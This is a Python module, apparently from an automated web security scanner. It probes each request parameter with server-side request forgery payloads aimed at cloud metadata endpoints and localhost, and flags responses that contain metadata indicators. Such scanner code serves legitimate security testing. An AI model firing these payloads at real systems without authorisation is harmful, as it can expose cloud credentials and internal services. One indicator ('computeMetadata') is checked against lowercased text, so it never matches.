from awap.engines.attack.base import AttackModule


class SSRFModule(AttackModule):
    module_id = "ssrf"
    vuln_class = "SSRF"

    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://127.0.0.1/",
        "http://localhost/",
    ]
    SSRF_INDICATORS = [
        "ami-id", "instance-id", "computeMetadata", "root:", "localhost",
    ]

    async def run(self, url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        for param in params:
            for payload in self.SSRF_PAYLOADS:
                try:
                    resp, meta = await self.send_payload(
                        url, "GET", payload, param["name"], param["type"], context
                    )
                    if not resp:
                        continue
                    body_lower = resp.text.lower()
                    for sig in self.SSRF_INDICATORS:
                        if sig in body_lower:
                            findings.append({
                                "vuln_class": "SSRF",
                                "url": url,
                                "method": "GET",
                                "param": param["name"],
                                "payload": payload,
                                "evidence": f"SSRF indicator: {sig}",
                                "severity": "HIGH",
                                "cvss": 8.5,
                                "request_raw": meta.get("request_raw"),
                                "response_raw": meta.get("response_raw"),
                            })
                            break
                except Exception:
                    pass
        return findings
